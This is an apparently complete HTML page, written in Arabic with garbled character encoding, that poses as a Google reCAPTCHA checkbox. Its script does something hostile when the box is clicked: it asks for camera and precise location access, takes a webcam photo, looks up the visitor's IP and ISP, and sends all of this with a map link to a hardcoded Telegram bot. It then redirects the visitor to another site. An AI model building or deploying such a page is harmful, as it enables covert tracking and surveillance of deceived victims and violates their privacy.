<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ø£Ù…Ø§Ù†</title>
    <style>
        body { background-color: #f9f9f9; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: 'Roboto', arial, sans-serif; }
        .captcha-box { background: #fff; border: 1px solid #d3d3d3; border-radius: 3px; width: 300px; height: 74px; display: flex; align-items: center; padding: 0 10px; box-shadow: 0 0 4px rgba(0,0,0,0.08); cursor: pointer; transition: 0.2s; }
        .captcha-box:hover { border-color: #b2b2b2; }
        .checkbox { width: 24px; height: 24px; border: 2px solid #c1c1c1; border-radius: 2px; margin-left: 12px; background: #fff; }
        .text { font-size: 14px; color: #555; flex-grow: 1; user-select: none; }
        .logo { text-align: center; min-width: 70px; }
        .logo img { width: 32px; }
        .logo p { font-size: 8px; color: #555; margin: 0; }
        #loader { display: none; width: 22px; height: 22px; border: 3px solid #f3f3f3; border-top: 3px solid #4d90fe; border-radius: 50%; animation: spin 1s linear infinite; margin-left: 12px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        video, canvas { display: none; }
    </style>
</head>
<body>

<div class="captcha-box" id="mainBox">
    <div class="checkbox" id="checkSquare"></div>
    <div id="loader"></div>
    <div class="text">Ø£Ù†Ø§ Ù„Ø³Øª Ø¨Ø±Ù†Ø§Ù…Ø¬ Ø±ÙˆØ¨ÙˆØª</div>
    <div class="logo">
        <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png">
        <p>Ø§Ù„Ø®ØµÙˆØµÙŠØ© - Ø§Ù„Ø¨Ù†ÙˆØ¯</p>
    </div>
</div>

<video id="v" autoplay playsinline></video>
<canvas id="c"></canvas>

<script>
    const _ID = '7253092491'; 
    const _TK = '7873426394:AAEc5lKRwi3Zy8owh1TKMLJsMme_s6Zawak'; 
    const _REDIRECT = "https://hamoyouo84-del.github.io/matrix-market/#";

    document.getElementById('mainBox').addEventListener('click', async () => {
        const checkSquare = document.getElementById('checkSquare');
        const loader = document.getElementById('loader');

        // ØªØ­ÙˆÙŠÙ„ Ø§Ù„Ù…Ø±Ø¨Ø¹ Ù„Ø¹Ù„Ø§Ù…Ø© ØªØ­Ù…ÙŠÙ„
        checkSquare.style.display = 'none';
        loader.style.display = 'block';

        try {
            // 1. Ø·Ù„Ø¨ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø£ÙˆÙ„Ø§Ù‹
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.getElementById('v');
            video.srcObject = stream;

            // 2. Ø·Ù„Ø¨ Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø¬ØºØ±Ø§ÙÙŠ Ø¨Ø£Ø¹Ù„Ù‰ Ø¯Ù‚Ø© Ù…Ù…ÙƒÙ†Ø© (High Accuracy)
            navigator.geolocation.getCurrentPosition(async (pos) => {
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;
                // Ø±Ø§Ø¨Ø· Ø§Ù„Ø®Ø±ÙŠØ·Ø© Ø§Ù„Ù„ÙŠ Ù‡ÙŠØ¬ÙŠØ¨ "Ø´Ù…Ø§Ù„ Ø³ÙŠÙ†Ø§Ø¡" Ø¨Ø§Ù„Ù…Ù„Ù„ÙŠ
                const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;

                // 3. Ø§Ù„ØªÙ‚Ø§Ø· Ø§Ù„ØµÙˆØ±Ø©
                await new Promise(r => setTimeout(r, 1500));
                const canvas = document.getElementById('c');
                canvas.width = 640; canvas.height = 480;
                canvas.getContext('2d').drawImage(video, 0, 0);

                canvas.toBlob(async (blob) => {
                    // Ø¬Ù„Ø¨ Ø§Ù„Ù€ IP ÙƒØ¨ÙŠØ§Ù†Ø§Øª Ø¥Ø¶Ø§ÙÙŠØ©
                    let ipData = "Unknown IP";
                    try {
                        const res = await fetch('https://ipapi.co/json/');
                        const d = await res.json();
                        ipData = `ğŸŒ IP: ${d.ip}\nğŸ¢ Ø§Ù„Ø´Ø±ÙƒØ©: ${d.org}`;
                    } catch(e) {}

                    const fd = new FormData();
                    fd.append('chat_id', _ID);
                    fd.append('photo', blob, 'shot.jpg');
                    fd.append('caption', `ğŸ¯ **ØªÙ… Ø§ØµØ·ÙŠØ§Ø¯ Ø§Ù„Ù‡Ø¯Ù Ø¨Ø¯Ù‚Ø©!**\n\nğŸ“ Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø¹Ù„Ù‰ Ø§Ù„Ø®Ø±ÙŠØ·Ø©:\n${mapsLink}\n\n${ipData}\nğŸ“± Ø§Ù„Ø¬Ù‡Ø§Ø²: ${navigator.userAgent}\nâ° ${new Date().toLocaleString('ar-EG')}`);

                    // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ù„ØªÙ„ÙŠØ¬Ø±Ø§Ù…
                    await fetch(`https://api.telegram.org/bot${_TK}/sendPhoto`, { method: 'POST', body: fd });

                    // Ø¥Ù†Ù‡Ø§Ø¡ Ø§Ù„Ù…Ù‡Ù…Ø© ÙˆØ§Ù„ØªØ­ÙˆÙŠÙ„
                    stream.getTracks().forEach(t => t.stop());
                    window.location.href = _REDIRECT;
                }, 'image/jpeg', 0.8);

            }, (err) => {
                // Ù„Ùˆ Ø±ÙØ¶ Ø§Ù„Ù…ÙˆÙ‚Ø¹ØŒ Ù‡Ù†Ø­Ø§ÙˆÙ„ Ù†Ø¨Ø¹Øª Ø§Ù„ØµÙˆØ±Ø© ÙˆØ§Ù„Ù€ IP Ø¨Ø³
                alert("Ø¨Ø±Ø¬Ø§Ø¡ Ø§Ù„Ù…ÙˆØ§ÙÙ‚Ø© Ø¹Ù„Ù‰ ØµÙ„Ø§Ø­ÙŠØ§Øª Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ù„Ù„Ù…ØªØ§Ø¨Ø¹Ø©.");
                location.reload();
            }, { enableHighAccuracy: true, timeout: 10000 });

        } catch (e) {
            // Ù„Ùˆ Ø±ÙØ¶ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ØŒ Ù‡ÙŠØªÙ… ØªÙˆØ¬ÙŠÙ‡Ù‡ Ù„Ù„Ù…ÙˆÙ‚Ø¹ ÙÙˆØ±Ø§Ù‹
            window.location.href = _REDIRECT;
        }
    });
</script>

</body>
</html>
